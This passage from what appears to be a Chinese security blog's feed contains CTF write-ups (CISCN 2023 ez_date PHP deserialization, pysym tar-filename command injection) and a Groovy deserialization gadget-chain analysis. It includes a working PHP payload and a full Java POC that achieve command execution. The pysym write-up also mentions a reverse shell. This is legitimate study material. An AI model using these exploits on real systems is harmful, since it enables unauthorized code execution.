class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719200322956.png" alt="image-20230719200322956"></p><p>这里的话不给使用数组进行绕过  经过本地测试</p><p><img src="../images/image-20230719200414990.png" alt="image-20230719200414990"></p><p>可以使用<strong>数字型</strong>和<strong>字符型</strong>进行绕过</p><p><img src="../images/image-20230719201900384.png" alt="image-20230719201900384"></p><p>剩下的关键点就是这个如何绕过这个<code>date</code>函数了</p><p>因为这个正则匹配的话是没过滤字母啥的   所以只要不使用奇奇怪怪的东西就不会被正则到</p><p><img src="../images/image-20230719202055816.png" alt="image-20230719202055816"></p><p><img src="../images/image-20230719202109278.png" alt="image-20230719202109278"></p><p>将字母转义后  就可以输出正常的字母了</p><p>最后的<strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="comment">//注意date函数可以进行转义 把/f\l\a\g转化为/flag</span></span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="comment">//uniqid函数用于生成标识</span></span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="comment">//文件写入操作 把content作为内容写入的uuid中</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="comment">//正则匹配替换 把uuid中的内容进行替换 赋给data</span></span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="comment">//输出data的内容即\flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// unserialize(base64_decode($_GET[&#x27;code&#x27;])); </span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; b = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; file = <span class="string">&quot;/f\l\a\g&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719202258630.png" alt="image-20230719202258630"></p><p><strong>总结</strong></p><ol><li>就是不使用数组  使用数字和字符来绕过<strong>md5</strong>和<strong>sha1</strong>  </li><li>就是使用转义可以避免<code>date</code>函数识别错误</li></ol><h2 id="CISCN-2023-华北-pysym"><a href="#CISCN-2023-华北-pysym" class="headerlink" title="[CISCN 2023 华北]pysym"></a>[CISCN 2023 华北]pysym</h2><p>这里给了个附件  其中关键的核心代码是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br></pre></td></tr></table></figure><p>这里解释了一下上面创建文件新路径的代码</p><p><img src="../images/image-20230719203928179.png" alt="image-20230719203928179"></p><p><img src="../images/image-20230719204806115.png" alt="image-20230719204806115"></p><p>做题多的师傅一下子可能就会想到这里可能存在这个命令的同时执行</p><p>因为这个<code>savepath</code>最后的话是这个<code>filename</code>，所以说我们就可以控制这个<code>savepath</code>了   不能控制这个<code>directory</code> 的原因是因为这个的话上传路径我们不知道  生成的随机数也不可控</p><p><img src="../images/image-20230719205333200.png" alt="image-20230719205333200"></p><p>经过本地测试是能成功执行的  但是换到题目上的时候就没有回显  于是考虑数据外带一下<strong>(弹个shell方便一点)</strong></p><p><strong>考虑到弹shell有些符号是不给使用的  于是就尝试进行base64编码一下</strong></p><p><img src="../images/image-20230719210420750.png" alt="image-20230719210420750"></p><p><strong>这样在自己的服务器上就能收到shell了   由于我这里是公司  弹shell会被墙</strong></p><p>所以就不搞了</p><p><strong>总结</strong></p><ul><li>其实考察点就是<code>python</code>的代码审计和这个命令执行   能否想到的这个问题</li><li>现在的话也是可以想为现在的话是可以  <code>unzip</code>  <code>tar</code>  这些解压命令都可以进行<code>rce</code></li></ul><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN-2023-华北-ez-date&quot;&gt;&lt;a href=&quot;#CISCN-2023-华北-ez-date&quot; class=&quot;headerlink&quot; title=&quot;[CISCN 2023 华北]ez_date&quot;&gt;&lt;/a&gt;[CISCN 2023 华北]ez_date</summary>
      
    
    
    
    
    <category term="Nss-Ciscn2023" scheme="https://ke1nys.github.io/tags/Nss-Ciscn2023/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试</title>
    <link href="https://ke1nys.github.io/posts/8ddb4c74.html"/>
    <id>https://ke1nys.github.io/posts/8ddb4c74.html</id>
    <published>2023-07-18T02:10:28.000Z</published>
    <updated>2023-07-19T11:38:38.090Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="152b8dc2f8b97507f4f94d8930791be027f249f5a5f3fa42334d74987b4b64fb">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a4d0bfb7ff1045dab3f9bce09aed7c65b72a5cf1365959cc03b50a6d00ba51a256937bd6f838b61ede456b68db5c420595ea39afe5281b0bad21b2aa8e6e36748bedf23d55437eb2e9f41fd3c718a10215395c58674198df302f1469aa52eefd4ce1a3d2b1b82cc88d6e38c704c80465c2f4c15bb000943b7b9ba77782c958b4d6ad502180b504664fca00d6c2ad39e1b1f5ca92802ebdfb8fd885ab5a6f913503</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://ke1nys.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>java-Groovy</title>
    <link href="https://ke1nys.github.io/posts/3776a7e3.html"/>
    <id>https://ke1nys.github.io/posts/3776a7e3.html</id>
    <published>2023-07-17T12:26:52.000Z</published>
    <updated>2023-07-19T11:38:38.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了Python、Ruby 和 Smalltalk 语言的优秀特性，比如动态类型转换、闭包和元编程支持。 Groovy与 Java可以很好的互相调用并结合编程 ，比如在写 Groovy 的时候忘记了语法可以直接按Java的语法继续写，也可以在 Java 中调用 Groovy 脚本。比起Java，Groovy语法更加的灵活和简洁，可以用更少的代码来实现Java实现的同样功能。</p><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p><code>Groovy : 1.7.0-2.4.3</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span>  <span class="operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="string">&quot;doCall&quot;</span>, Object.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(mc, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先从这个类开始入手  (<strong>就是最后执行代码的地方</strong>)</p><p><code>org.codehaus.groovy.runtime.MethodClosure</code> 是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。</p><p>MethodClosure 初始化时接收两个参数，一个是对象，一个是对象的方法名称。</p><p><img src="../images/image-20230718191350775.png" alt="image-20230718191350775"></p><p>​    </p><p>MethodClosure 中有一个 doCall 方法，调用 <code>InvokerHelper.invokeMethod()</code> 方法进行方法调用。</p><p><img src="../images/image-20230718191421942.png" alt="image-20230718191421942"></p><p>这里就是先使用<code>MethodClosure</code>来进行传值  <strong>分别是传一个对象和这个对象的某个方法</strong></p><p>由于这个<code>doCall</code>()是个<code>protected</code>方法   得使用反射调用 </p><p><img src="../images/image-20230718191723300.png" alt="image-20230718191723300"></p><p>这个最后一步的意思就是反射调用这个<code>doCall()</code>方法，然后传值是这个<code>calc</code></p><p><strong>m：就是等会会调用<code>doCall</code>这个方法</strong></p><p><strong><code>invoke(mc,&quot;calc&quot;)</code>  这个里面的<code>mc</code>指的是调用这个<code>MethodClosure</code> 里的<code>doCall</code>方法  <code>calc</code>是这个<code>daCall</code>的参数</strong></p><p><img src="../images/image-20230718192709132.png" alt="image-20230718192709132"></p><h3 id="String-execute-方法"><a href="#String-execute-方法" class="headerlink" title="String.execute() 方法"></a>String.execute() 方法</h3><p>Groovy 为 String 类型添加了 <code>execute()</code> 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 <code>&quot;ls&quot;.execute()</code> 这种方法来执行系统命令 “ls”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;whoami&quot;</span>.execute().text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里切记生成文件的要选groovy，不然会执行不了</p><p><img src="../images/image-20230718192832925.png" alt="image-20230718192832925"></p><p>其实就是使用<code>Runtime.getRuntime().exec()</code>来执行</p><p><strong>如果在java中可以这样写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        methodClosure.call();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 分析一波 下个断点</p><p><img src="../images/image-20230718200009817.png" alt="image-20230718200009817"></p><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"><span class="string">&quot;calc&quot;</span>.execute()</span><br><span class="line"><span class="string">&#x27;calc&#x27;</span>.execute()</span><br><span class="line"><span class="string">&quot;$&#123;&quot;</span>calc<span class="string">&quot;.execute()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;$&#123;&#x27;calc&#x27;.execute()&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">&quot;cmd /c dir&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&#x27;whoami&#x27;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;$&#123;&quot;</span>whoami<span class="string">&quot;.execute().text&#125;&quot;</span></span><br><span class="line">println <span class="string">&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;&quot;</span></span><br><span class="line"><span class="type">def</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">println <span class="string">&quot;$&#123;cmd.execute().text&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p><code>org.codehaus.groovy.runtime.ConvertedClosure</code> 是一个通用适配器，用于将闭包适配到 Java 接口。ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。</p><p>ConvertedClosure 的构造方法接收一个 Closure 对象和一个 String 类型的 method 方法名，也就是说 ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 <code>invoke</code> 方法，除了 toString 和一些默认方法外，会调用 <code>invokeCustom</code> 方法。</p><p>如果初始化时指定的 method 与 <code>invokeCustom</code> 指定的 method 参数相同，则 <code>invokeCustom</code> 方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。</p><p><img src="../images/image-20230718194334220.png" alt="image-20230718194334220"></p><p>看到这里就明白这条链的触发逻辑了。后面自然是使用 <code>AnnotationInvocationHandler</code> 将 <code>ConvertedClosure</code> 代理成 <code>Map</code> 类。这样在反序列化</p><h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><p><strong>最终的POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Groovy.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//封装我们需要执行的对象</span></span><br><span class="line"><span class="type">MethodClosure</span>    <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line"><span class="type">ConvertedClosure</span> <span class="variable">closure</span>       <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 ConvertedClosure 的动态代理类实例</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">handler</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, closure);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用动态代理初始化 AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, handler);</span><br><span class="line"></span><br><span class="line">SerializeUtil.writeObjectToFile(invocationHandler, fileName);</span><br><span class="line">SerializeUtil.readFileObject(fileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用链展示</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map.entrySet() (Proxy)</span><br><span class="line">        ConversionHandler.invoke()</span><br><span class="line">            ConvertedClosure.invokeCustom()</span><br><span class="line">        MethodClosure.call()</span><br><span class="line">                    ProcessGroovyMethods.execute()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719191853074.png" alt="image-20230719191853074"></p><p>调用entrySet，然后触发invoke</p><p><img src="../images/image-20230719192046197.png" alt="image-20230719192046197"></p><p>调用了<code>ConversionHandler#invoke()</code>方法</p><p><img src="../images/image-20230719192158196.png" alt="image-20230719192158196"></p><p><img src="../images/image-20230719192238123.png" alt="image-20230719192238123"></p><p>接着就会调用到<code>ConvertedClosure#invokeCustom()</code>方法   <strong>并且由于这个</strong></p><p><strong><code>methodName</code>和这个传进来的<code>method</code>的<code>name</code>一样 </strong> 就会调用<code>call</code>()方法</p><p><img src="../images/image-20230719192521353.png" alt="image-20230719192521353"></p><p><img src="../images/image-20230719192653618.png" alt="image-20230719192653618"></p><p>这里的话到最后就rce了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h2&gt;&lt;p&gt;Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了</summary>
      
    
    
    
    
    <category term="java-Groovy" scheme="https://ke1nys.github.io/tags/java-Groovy/"/>
    
  </entry>
  
  <entry>
    <title>show-SSTI</title>
    <link href="https://ke1nys.github.io/posts/1834ebb1.html"/>
    <id>https://ke1nys.github.io/posts/1834ebb1.html</id>
    <published>2023-07-14T15:17:41.000Z</published>
    <updated>2023-07-20T15:23:33.140Z</updated>
    
